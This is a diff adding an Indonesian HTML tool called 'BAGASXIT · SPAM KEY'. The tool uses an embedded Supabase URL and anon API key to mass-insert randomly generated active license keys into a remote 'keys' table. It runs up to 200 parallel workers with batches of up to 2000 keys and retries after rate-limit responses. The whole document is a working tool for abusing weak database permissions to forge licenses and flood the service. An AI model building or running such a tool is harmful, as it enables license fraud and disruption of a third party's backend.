@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BAGASXIT · SPAM KEY</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Inter:wght@500;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',sans-serif;background:#050506;color:#F5F5F7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.kotak{max-width:520px;width:100%;background:#0E0E12;border:1px solid #262631;border-radius:20px;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,.7)}
+h1{font-size:18px;font-weight:900;color:#A855F7;margin-bottom:4px}
+.sub{color:#55555D;font-size:11px;margin-bottom:18px}
+.status{display:inline-block;padding:6px 14px;border-radius:20px;font-size:11px;font-weight:800;margin-bottom:16px}
+.status.idle{background:rgba(168,85,247,.15);color:#A855F7;border:1px solid #A855F7}
+.status.jalan{background:rgba(16,185,129,.15);color:#10B981;border:1px solid #10B981}
+.status.error{background:rgba(239,68,68,.15);color:#EF4444;border:1px solid #EF4444}
+.baris-input{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
+.kolom{background:#141419;border:1px solid #262631;border-radius:10px;padding:10px 12px}
+.kolom label{display:block;font-size:10px;color:#8E8E96;font-weight:700;margin-bottom:4px}
+.kolom input{width:100%;background:transparent;border:none;outline:none;color:#F5F5F7;font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600}
+.panel{background:#0A0A0D;border:1px solid #262631;border-radius:14px;padding:16px;margin-bottom:14px}
+.panel .judul{font-size:11px;color:#55555D;font-weight:800;letter-spacing:1px;margin-bottom:10px}
+.angka-baris{display:flex;justify-content:space-between;align-items:center;font-family:'JetBrains Mono',monospace;font-size:12px;padding:6px 0;border-bottom:1px solid #1C1C24}
+.angka-baris:last-child{border-bottom:none}
+.angka-baris .label{color:#8E8E96;font-size:11px}
+.angka-baris .nilai{color:#10B981;font-weight:800;font-size:15px}
+.angka-baris .nilai.merah{color:#EF4444}
+.angka-baris .nilai.kuning{color:#F59E0B}
+.angka-baris .nilai.biru{color:#06B6D4}
+.progress{height:6px;background:#262631;border-radius:6px;overflow:hidden;margin-top:10px}
+.progress div{height:100%;background:linear-gradient(90deg,#A855F7,#06B6D4);width:0%;transition:width .3s}
+.log{background:#000;border:1px solid #1C1C24;border-radius:10px;padding:10px;font-family:'JetBrains Mono',monospace;font-size:11px;color:#10B981;height:140px;overflow-y:auto;margin-bottom:14px;line-height:1.6}
+.log .merah{color:#EF4444}
+.log .kuning{color:#F59E0B}
+.log .abu{color:#55555D}
+.tombol{width:100%;padding:14px;border-radius:12px;border:none;cursor:pointer;font-family:'Inter',sans-serif;font-size:14px;font-weight:900;transition:.2s;color:#fff}
+.tombol:active{transform:scale(.97)}
+.tombol:disabled{opacity:.4;cursor:not-allowed}
+.tombol-biru{background:linear-gradient(135deg,#06B6D4,#0891B2);margin-bottom:8px}
+.tombol-ungu{background:linear-gradient(135deg,#A855F7,#7C3AED)}
+.tombol-merah{background:linear-gradient(135deg,#EF4444,#B91C1C);display:none}
+.catatan{font-size:11px;color:#55555D;margin-top:10px;text-align:center;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="kotak">
+  <h1>BAGASXIT · SPAM KEY</h1>
+  <div class="sub">Alat ini menyuntik key baru ke database Supabase</div>
+
+  <div class="status idle" id="status">SIAP</div>
+
+  <div class="baris-input">
+    <div class="kolom">
+      <label>PARALEL (1-200)</label>
+      <input id="paralel" type="number" value="25" min="1" max="200">
+    </div>
+    <div class="kolom">
+      <label>PER REQUEST (1-2000)</label>
+      <input id="perReq" type="number" value="500" min="1" max="2000">
+    </div>
+    <div class="kolom">
+      <label>DURASI (detik)</label>
+      <input id="durasi" type="number" value="60" min="1" max="3600">
+    </div>
+    <div class="kolom">
+      <label>AWALAN KEY</label>
+      <input id="awalan" type="text" value="BX-">
+    </div>
+  </div>
+
+  <button class="tombol tombol-biru" id="btnCek">🔍 CEK JUMLAH KEY SEKARANG</button>
+
+  <div class="panel">
+    <div class="judul">HASIL SPAM</div>
+    <div class="angka-baris"><span class="label">Key berhasil masuk</span><span class="nilai" id="hBerhasil">0</span></div>
+    <div class="angka-baris"><span class="label">Total request dikirim</span><span class="nilai biru" id="hRequest">0</span></div>
+    <div class="angka-baris"><span class="label">Request gagal</span><span class="nilai merah" id="hGagal">0</span></div>
+    <div class="angka-baris"><span class="label">Koneksi putus</span><span class="nilai kuning" id="hPutus">0</span></div>
+    <div class="angka-baris"><span class="label">Kecepatan (key/detik)</span><span class="nilai" id="hSpeed">0</span></div>
+    <div class="angka-baris"><span class="label">Key di database sekarang</span><span class="nilai biru" id="hTotal">?</span></div>
+    <div class="progress"><div id="progressBar"></div></div>
+  </div>
+
+  <div class="log" id="log"></div>
+
+  <button class="tombol tombol-ungu" id="btnMulai">▶ MULAI SPAM</button>
+  <button class="tombol tombol-merah" id="btnStop">■ STOP</button>
+
+  <div class="catatan">Tekan <b>CEK JUMLAH KEY</b> dulu untuk lihat isi database. Lalu <b>MULAI SPAM</b>.</div>
+</div>
+
+<script>
+// ====== PENGATURAN DATABASE ======
+var ALAMAT_DB = 'https://qlzwqbbvjscfjaicbhks.supabase.co';
+var KUNCI_API = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFsendxYmJ2anNjZmphaWNiaGtzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA0ODU3MTQsImV4cCI6MjEwNjA2MTcxNH0.UF71O0P7Fza20cUEVmAYlzmksmTKrrp0WUeZjZyATew';
+// =================================
+
+var sedangJalan = false;
+var harusStop = false;
+var hitung = { berhasil:0, request:0, gagal:0, putus:0 };
+var waktuMulai = 0;
+var timerProgress = null;
+var timerKecepatan = null;
+var terakhirBerhasil = 0;
+var terakhirWaktu = 0;
+
+var $ = function(id){ return document.getElementById(id); };
+var logEl = $('log');
+
+function tulisLog(pesan, warna){
+  var span = document.createElement('span');
+  if (warna) span.className = warna;
+  span.textContent = pesan;
+  logEl.appendChild(span);
+  logEl.appendChild(document.createElement('br'));
+  logEl.scrollTop = logEl.scrollHeight;
+  while (logEl.childNodes.length > 200){
+    logEl.removeChild(logEl.firstChild);
+    logEl.removeChild(logEl.firstChild);
+  }
+}
+
+function setStatus(teks, kelas){
+  var el = $('status');
+  el.textContent = teks;
+  el.className = 'status ' + (kelas || 'idle');
+}
+
+function buatKeyAcak(){
+  var huruf = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  var hasil = '';
+  for (var i = 0; i < 6; i++){
+    hasil += huruf.charAt(Math.floor(Math.random() * 36));
+  }
+  return $('awalan').value + hasil.toUpperCase();
+}
+
+// Cek jumlah key di database pakai header Content-Range
+async function cekJumlahKey(){
+  try {
+    var respon = await fetch(ALAMAT_DB + '/rest/v1/keys?select=key&limit=1', {
+      headers: {
+        'apikey': KUNCI_API,
+        'Authorization': 'Bearer ' + KUNCI_API,
+        'Prefer': 'count=exact',
+        'Range': '0-0'
+      }
+    });
+    var cr = respon.headers.get('content-range') || '';
+    var cocok = cr.match(/\/(\d+|\*)/);
+    return cocok ? cocok[1] : '?';
+  } catch(e){
+    return '?';
+  }
+}
+
+// Kirim 1 batch (banyak key sekaligus dalam 1 request)
+async function kirimBatch(jumlah){
+  var sekarang = Date.now();
+  var daftar = [];
+  for (var i = 0; i < jumlah; i++){
+    daftar.push({
+      key: buatKeyAcak(),
+      expires_at: new Date(sekarang + 5 * 3600 * 1000).toISOString(),
+      is_active: true,
+      hwid: null
+    });
+  }
+  var respon = await fetch(ALAMAT_DB + '/rest/v1/keys', {
+    method: 'POST',
+    headers: {
+      'apikey': KUNCI_API,
+      'Authorization': 'Bearer ' + KUNCI_API,
+      'Content-Type': 'application/json',
+      'Prefer': 'return=minimal'
+    },
+    body: JSON.stringify(daftar)
+  });
+  return {
+    kode: respon.status,
+    sukses: respon.ok,
+    tunggu: respon.headers.get('retry-after')
+  };
+}
+
+// Satu pekerja: terus kirim batch sampai dihentikan
+async function pekerja(){
+  while (sedangJalan && !harusStop){
+    var jumlah = Math.max(1, parseInt($('perReq').value) || 500);
+    try {
+      var hasil = await kirimBatch(jumlah);
+      hitung.request++;
+
+      if (hasil.sukses){
+        hitung.berhasil += jumlah;
+      } else if (hasil.kode === 409){
+        hitung.gagal++;
+        tulisLog('409 — key bentrok, coba lagi', 'kuning');
+        await tunggu(50);
+      } else if (hasil.kode === 429){
+        hitung.gagal++;
+        var detik = (parseInt(hasil.tunggu) || 2);
+        tulisLog('429 — kena limit, tunggu ' + detik + ' detik', 'kuning');
+        await tunggu(detik * 1000);
+      } else {
+        hitung.gagal++;
+        tulisLog('Error HTTP ' + hasil.kode, 'merah');
+      }
+    } catch(e){
+      hitung.putus++;
+      tulisLog('Koneksi putus: ' + e.message, 'merah');
+      await tunggu(200);
+    }
+  }
+}
+
+function tunggu(ms){
+  return new Promise(function(resolve){ setTimeout(resolve, ms); });
+}
+
+function tampilkanHasil(){
+  $('hBerhasil').textContent = hitung.berhasil.toLocaleString('id-ID');
+  $('hRequest').textContent = hitung.request.toLocaleString('id-ID');
+  $('hGagal').textContent = hitung.gagal.toLocaleString('id-ID');
+  $('hPutus').textContent = hitung.putus.toLocaleString('id-ID');
+
+  var detik = (Date.now() - waktuMulai) / 1000;
+  $('hSpeed').textContent = detik > 0 ? Math.round(hitung.berhasil / detik).toLocaleString('id-ID') : '0';
+
+  var totalDurasi = parseInt($('durasi').value) || 60;
+  var persen = Math.min(100, (detik / totalDurasi) * 100);
+  $('progressBar').style.width = persen + '%';
+}
+
+async function mulaiSpam(){
+  if (sedangJalan) return;
+  sedangJalan = true;
+  harusStop = false;
+  hitung = { berhasil:0, request:0, gagal:0, putus:0 };
+  waktuMulai = Date.now();
+
+  $('btnMulai').style.display = 'none';
+  $('btnStop').style.display = 'block';
+  $('btnCek').disabled = true;
+  logEl.innerHTML = '';
+
+  setStatus('SEDANG JALAN', 'jalan');
+  tulisLog('> mulai spam...', 'abu');
+  tulisLog('> paralel=' + $('paralel').value + ' per-request=' + $('perReq').value, 'abu');
+
+  var paralel = Math.max(1, parseInt($('paralel').value) || 25);
+  var durasiMs = (parseInt($('durasi').value) || 60) * 1000;
+  var batasWaktu = Date.now() + durasiMs;
+
+  // Jalankan banyak pekerja sekaligus
+  var semuaPekerja = [];
+  for (var i = 0; i < paralel; i++){
+    semuaPekerja.push(pekerja());
+  }
+
+  timerProgress = setInterval(function(){
+    tampilkanHasil();
+    if (Date.now() >= batasWaktu){
+      harusStop = true;
+    }
+  }, 300);
+
+  timerKecepatan = setInterval(tampilkanHasil, 1000);
+
+  // Tunggu semua pekerja selesai
+  await Promise.all(semuaPekerja);
+
+  clearInterval(timerProgress);
+  clearInterval(timerKecepatan);
+  tampilkanHasil();
+
+  sedangJalan = false;
+  $('btnMulai').style.display = 'block';
+  $('btnStop').style.display = 'none';
+  $('btnCek').disabled = false;
+  setStatus('SELESAI', 'idle');
+  tulisLog('> selesai. berhasil=' + hitung.berhasil.toLocaleString('id-ID'), 'abu');
+}
+
+function stopSpam(){
+  harusStop = true;
+  tulisLog('> stop diminta...', 'kuning');
+}
+
+$('btnCek').onclick = async function(){
+  $('btnCek').disabled = true;
+  setStatus('MENGHITUNG...', 'jalan');
+  try {
+    var jumlah = await cekJumlahKey();
+    $('hTotal').textContent = jumlah;
+    tulisLog('> jumlah key sekarang: ' + jumlah, 'abu');
+    setStatus('SIAP', 'idle');
+  } catch(e){
+    tulisLog('gagal cek: ' + e.message, 'merah');
+    setStatus('GAGAL', 'error');
+  }
+  $('btnCek').disabled = false;
+};
+
+$('btnMulai').onclick = mulaiSpam;
+$('btnStop').onclick = stopSpam;
+
+// Otomatis cek jumlah key saat halaman dibuka
+(async function(){
+  try {
+    var jumlah = await cekJumlahKey();
+    $('hTotal').textContent = jumlah;
+    tulisLog('> jumlah key sekarang: ' + jumlah, 'abu');
+  } catch(e){}
+})();
+</script>
+</body>
+</html>
